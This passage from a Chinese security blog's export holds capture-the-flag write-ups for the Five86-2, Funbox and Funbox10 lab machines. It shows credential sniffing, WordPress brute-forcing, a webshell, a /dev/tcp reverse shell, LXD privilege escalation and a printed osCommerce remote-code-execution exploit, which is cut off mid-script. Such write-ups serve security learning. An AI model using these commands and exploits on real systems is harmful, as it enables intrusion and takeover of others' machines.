52)</span><br><span class="line">    172.18.0.10.21 &gt; 172.18.0.1.42598: Flags [.], cksum 0x5856 (incorrect -&gt; 0x0a69), ack 12, win 510, options [nop,nop,TS val 3762164611 ecr 3766911928], length 0</span><br><span class="line">10:10:01.542601 IP (tos 0x0, ttl 64, id 18618, offset 0, flags [DF], proto TCP (6), length 84)</span><br><span class="line">    172.18.0.10.21 &gt; 172.18.0.1.42598: Flags [P.], cksum 0x5876 (incorrect -&gt; 0x5b0a), seq 58:90, ack 12, win 510, options [nop,nop,TS val 3762164611 ecr 3766911928], length 32: FTP, length: 32</span><br><span class="line">        331 Password required for paul</span><br><span class="line">10:10:01.542883 IP (tos 0x10, ttl 64, id 62236, offset 0, flags [DF], proto TCP (6), length 52)</span><br><span class="line">    172.18.0.1.42598 &gt; 172.18.0.10.21: Flags [.], cksum 0x5856 (incorrect -&gt; 0x0a50), ack 90, win 502, options [nop,nop,TS val 3766911929 ecr 3762164611], length 0</span><br><span class="line">10:10:01.543022 IP (tos 0x10, ttl 64, id 62237, offset 0, flags [DF], proto TCP (6), length 73)</span><br><span class="line">    172.18.0.1.42598 &gt; 172.18.0.10.21: Flags [P.], cksum 0x586b (incorrect -&gt; 0x2ca9), seq 12:33, ack 90, win 502, options [nop,nop,TS val 3766911929 ecr 3762164611], length 21: FTP, length: 21</span><br><span class="line">        PASS esomepasswford</span><br></pre></td></tr></table></figure>

<p>获得 <code>paul / esomepasswford</code></p>
<ul>
<li>登录</li>
</ul>
<p><img data-src="./Five86-2/11.png" alt></p>
<ul>
<li>切换到用户 <code>peter</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u peter service ../../../../bin/bash</span><br></pre></td></tr></table></figure>

<p><img data-src="./Five86-2/12.png" alt></p>
<ul>
<li><code>flag</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u root passwd root</span><br></pre></td></tr></table></figure>

<p><img data-src="./Five86-2/13.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Five86</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Funbox</title>
    <url>/2021/07/14/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Funbox/</url>
    <content><![CDATA[<h1 id="Funbox"><a href="#Funbox" class="headerlink" title="Funbox"></a>Funbox</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Funbox</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:5b, IPv4: 192.168.1.224</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1	d8:c8:e9:fe:be:88	Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.1.189	b0:25:aa:2d:f5:9b	Private</span><br><span class="line">192.168.1.191	08:00:27:29:04:c8	PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.215	20:41:10:1a:04:8c	(Unknown)</span><br><span class="line">192.168.1.163	a4:50:46:78:16:9f	Xiaomi Communications Co Ltd</span><br><span class="line"></span><br><span class="line">6 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 6 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.191</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.191</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox1]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.1.191</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-13 19:57 EDT</span><br><span class="line">Nmap scan report for funbox.lan (192.168.1.191)</span><br><span class="line">Host is up (0.0024s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp     ProFTPD</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 d2:f6:53:1b:5a:49:7d:74:8d:44:f5:46:e3:93:29:d3 (RSA)</span><br><span class="line">|   256 a6:83:6f:1b:9c:da:b4:41:8c:29:f4:ef:33:4b:20:e0 (ECDSA)</span><br><span class="line">|_  256 a6:5b:80:03:50:19:91:66:b6:c3:98:b8:c4:4f:5c:bd (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/secret/</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://funbox.fritz.box/</span><br><span class="line">33060/tcp open  mysqlx?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: </span><br><span class="line">|     Invalid message"</span><br><span class="line">|_    HY000</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port33060-TCP:V=7.91%I=7%D=7/13%Time=60EE2873%P=x86_64-pc-linux-gnu%r(N</span><br><span class="line">SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\</span><br><span class="line">SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp</span><br><span class="line">SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b</span><br><span class="line">SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers</span><br><span class="line">SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2</span><br><span class="line">SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI</span><br><span class="line">SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")</span><br><span class="line">SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01</span><br><span class="line">SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie</span><br><span class="line">SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x</span><br><span class="line">SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"</span><br><span class="line">SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9</span><br><span class="line">SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\</span><br><span class="line">SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0</span><br><span class="line">SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,</span><br><span class="line">SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0</span><br><span class="line">SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\</span><br><span class="line">SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions</span><br><span class="line">SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x</span><br><span class="line">SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"</span><br><span class="line">SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1</span><br><span class="line">SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000</span><br><span class="line">SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0</span><br><span class="line">SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r</span><br><span class="line">SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0</span><br><span class="line">SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\</span><br><span class="line">SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");</span><br><span class="line">MAC Address: 08:00:27:29:04:C8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 31.35 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Funbox/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox1]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.191/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/13 20:00:40 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 61294]</span><br><span class="line">/wp-content           (Status: 301) [Size: 319] [--&gt; http://192.168.1.191/wp-content/]</span><br><span class="line">/wp-login.php         (Status: 200) [Size: 4502]                                      </span><br><span class="line">/license.txt          (Status: 200) [Size: 19915]                                     </span><br><span class="line">/wp-includes          (Status: 301) [Size: 320] [--&gt; http://192.168.1.191/wp-includes/]</span><br><span class="line">/readme.html          (Status: 200) [Size: 7278]                                       </span><br><span class="line">/robots.txt           (Status: 200) [Size: 19]                                         </span><br><span class="line">/wp-trackback.php     (Status: 200) [Size: 135]                                        </span><br><span class="line">/secret               (Status: 301) [Size: 315] [--&gt; http://192.168.1.191/secret/]     </span><br><span class="line">/wp-admin             (Status: 301) [Size: 317] [--&gt; http://192.168.1.191/wp-admin/]   </span><br><span class="line">/xmlrpc.php           (Status: 405) [Size: 42]                                         </span><br><span class="line">/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://funbox.fritz.box/wp-login.php?action=register]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                                         </span><br><span class="line">                                                                                                        </span><br><span class="line">===============================================================</span><br><span class="line">2021/07/13 20:05:21 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 配置host</span><br><span class="line">192.168.1.191 funbox.fritz.box</span><br></pre></td></tr></table></figure>

<p><img data-src="./Funbox/2.png" alt></p>
<h3 id="WPSCAN"><a href="#WPSCAN" class="headerlink" title="WPSCAN"></a>WPSCAN</h3><ul>
<li>开始扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://funbox.fritz.box/ --enumerate u</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] joe</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>

<ul>
<li>暴力破解</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cewl http://funbox.fritz.box/ -w funbox_dict.txt</span><br><span class="line">wpscan --url http://funbox.fritz.box/ -U funbox_user.txt -P funbox_dict.txt --force</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; </span></span><br><span class="line">失败</span><br><span class="line"></span><br><span class="line">wpscan --url http://funbox.fritz.box/ -U funbox_user.txt -P /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: joe, Password: 12345</span><br><span class="line"> | Username: admin, Password: iubire</span><br></pre></td></tr></table></figure>

<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul>
<li>进入后台，编辑<code>404.php</code></li>
</ul>
<p><img data-src="./Funbox/3.png" alt></p>
<p><img data-src="./Funbox/4.png" alt></p>
<p><img data-src="./Funbox/5.png" alt></p>
<ul>
<li>尝试 切换用户 <code>joe / 12345</code>, 成功</li>
</ul>
<p><img data-src="./Funbox/6.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;<code>Flag</code></h3><ul>
<li>逃逸<code>rbash</code></li>
</ul>
<p><img data-src="./Funbox/7.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p><img data-src="./Funbox/8.png" alt></p>
<ul>
<li>发现脚本文件</li>
</ul>
<p><img data-src="./Funbox/9.png" alt></p>
<ul>
<li>修改<code>.backup.sh</code></li>
</ul>
<p><img data-src="./Funbox/10.png" alt></p>
<ul>
<li>偶然反弹<code>shell</code>,发现这个</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.224&#x2F;7776 0&gt;&amp;1 # 这句话起作用</span><br></pre></td></tr></table></figure>

<p><img data-src="./Funbox/11.png" alt></p>
<ul>
<li><code>lxd</code>提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line"></span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.1.224/alpine-v3.14-x86_64-20210715_1021.tar.gz</span><br><span class="line"></span><br><span class="line">/snap/bin/lxc image import ./alpine-v3.14-x86_64-20210715_1021.tar.gz --alias myimage</span><br><span class="line"></span><br><span class="line">/snap/bin/lxc image list</span><br><span class="line">/snap/bin/lxd init</span><br><span class="line">/snap/bin/lxc init myimage ignite -c security.privileged=true</span><br><span class="line">/snap/bin/lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line">/snap/bin/lxc start ignite</span><br><span class="line">/snap/bin/lxc exec ignite /bin/sh</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">cd /mnt/root/root</span><br><span class="line">ls</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>

<p><img data-src="./Funbox/12.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Funbox</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Funbox10</title>
    <url>/2021/08/08/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Funbox10/</url>
    <content><![CDATA[<h1 id="Funbox10"><a href="#Funbox10" class="headerlink" title="Funbox10"></a>Funbox10</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Funbox10</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:5b, IPv4: 192.168.1.224</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1	d8:c8:e9:fe:be:88	Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2	20:41:10:1a:04:8c	(Unknown)</span><br><span class="line">192.168.1.3	00:11:32:73:68:3b	Synology Incorporated</span><br><span class="line">192.168.1.5	00:0c:29:76:5e:9f	VMware, Inc.</span><br><span class="line">192.168.1.108	08:00:27:e2:61:b8	PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.109	40:31:3c:22:9c:f3	XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.111	38:d2:ca:db:01:69	Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.1.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.1.189	b0:25:aa:2d:f5:9b	Private</span><br><span class="line">192.168.1.190	32:f9:e9:ee:d8:ba	(Unknown: locally administered)</span><br><span class="line"></span><br><span class="line">10 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.938 seconds (132.09 hosts/sec). 10 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.108</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.108</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.1.108</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 04:15 EDT</span><br><span class="line">Nmap scan report for funbox10.lan (192.168.1.108)</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a2:35:c4:90:87:20:4e:b2:59:78:19:da:da:8b:c6:ed (RSA)</span><br><span class="line">|   256 55:7c:a9:99:35:1b:0e:c1:ff:5d:12:a2:1c:70:7b:84 (ECDSA)</span><br><span class="line">|_  256 20:97:69:f0:8f:e0:c9:07:ee:b0:4f:02:fb:9b:ca:0c (ED25519)</span><br><span class="line">25/tcp  open  smtp    Postfix smtpd</span><br><span class="line">|_smtp-commands: funbox10, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br><span class="line">| ssl-cert: Subject: commonName=funbox10</span><br><span class="line">| Not valid before: 2021-06-24T17:27:09</span><br><span class="line">|_Not valid after:  2031-06-22T17:27:09</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Khronos 2.0 - Slides</span><br><span class="line">110/tcp open  pop3    Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE UIDL RESP-CODES PIPELINING TOP CAPA SASL</span><br><span class="line">143/tcp open  imap    Dovecot imapd</span><br><span class="line">|_imap-capabilities: ID IDLE LOGINDISABLEDA0001 IMAP4rev1 Pre-login more OK post-login SASL-IR listed LOGIN-REFERRALS ENABLE LITERAL+ capabilities have</span><br><span class="line">MAC Address: 08:00:27:E2:61:B8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: Host:  funbox10; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Funbox10/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.108/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.108/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.108/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              txt,php,html</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/08 04:16:08 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 315] [--&gt; http://192.168.1.108/images/]</span><br><span class="line">/index.html           (Status: 200) [Size: 40070]                                 </span><br><span class="line">/catalog              (Status: 301) [Size: 316] [--&gt; http://192.168.1.108/catalog/]</span><br><span class="line">/css                  (Status: 301) [Size: 312] [--&gt; http://192.168.1.108/css/]    </span><br><span class="line">/js                   (Status: 301) [Size: 311] [--&gt; http://192.168.1.108/js/]     </span><br><span class="line">/styles.html          (Status: 200) [Size: 49211]                                  </span><br><span class="line">/readme.txt           (Status: 200) [Size: 4919]                                   </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                    </span><br><span class="line">                                                                                   </span><br><span class="line">===============================================================</span><br><span class="line">2021/08/08 04:17:50 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Funbox10/2.png" alt></p>
<h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><ul>
<li>发现开源<code>cms</code></li>
</ul>
<p><img data-src="./Funbox10/3.png" alt></p>
<p><img data-src="./Funbox10/4.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: osCommerce 2.3.4.1 - Remote Code Execution (2)</span></span><br><span class="line"><span class="comment"># Vulnerability: Remote Command Execution when /install directory wasn't removed by the admin</span></span><br><span class="line"><span class="comment"># Exploit: Exploiting the install.php finish process by injecting php payload into the db_database parameter &amp; read the system command output from configure.php</span></span><br><span class="line"><span class="comment"># Notes: The RCE doesn't need to be authenticated</span></span><br><span class="line"><span class="comment"># Date: 26/06/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: Bryan Leong &lt;NobodyAtall&gt;</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://www.oscommerce.com/</span></span><br><span class="line"><span class="comment"># Version: osCommerce 2.3.4</span></span><br><span class="line"><span class="comment"># Tested on: Windows</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">	print(<span class="string">"please specify the osCommerce url"</span>)</span><br><span class="line">	print(<span class="string">"format: python3 osCommerce2_3_4RCE.py &lt;url&gt;"</span>)</span><br><span class="line">	print(<span class="string">"eg: python3 osCommerce2_3_4RCE.py http://localhost/oscommerce-2.3.4/catalog"</span>)</span><br><span class="line">	sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">baseUrl = sys.argv[<span class="number">1</span>]</span><br><span class="line">testVulnUrl = baseUrl + <span class="string">'/install/install.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rce</span><span class="params">(command)</span>:</span></span><br><span class="line">	<span class="comment">#targeting the finish step which is step 4</span></span><br><span class="line">	targetUrl = baseUrl + <span class="string">'/install/install.php?step=4'</span></span><br><span class="line"></span><br><span class="line">	payload = <span class="string">"');"</span></span><br><span class="line">	payload += <span class="string">"passthru('"</span> + command + <span class="string">"');"</span>    <span class="comment"># injecting system command here</span></span><br><span class="line">	payload += <span class="string">"/*"</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#injecting parameter</span></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">'DIR_FS_DOCUMENT_ROOT'</span>: <span class="string">'./'</span>,</span><br><span class="line">		<span class="string">'DB_DATABASE'</span> : payload</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	response = requests.post(targetUrl, data=data)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(response.status_code == <span class="number">200</span>):</span><br><span class="line">		<span class="comment">#print('[*] Successfully injected payload to config file')</span></span><br><span class="line"></span><br><span class="line">		readCMDUrl = baseUrl + <span class="string">'/install/includes/configure.php'</span></span><br><span class="line">		cmd = requests.get(readCMDUrl)</span><br><span class="line"></span><br><span class="line">		commandRsl = cmd.text.split(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(cmd.status_code == <span class="number">200</span>):</span><br><span class="line">			<span class="comment">#print('[*] System Command Execution Completed')</span></span><br><span class="line">			<span class="comment">#removing the error message above</span></span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, len(commandRsl)):</span><br><span class="line">				print(commandRsl[i])</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'[!] Configure.php not found'</span></span><br><span class="line"></span><br><span class="line">				</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'[!] Fail to inject payload'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span 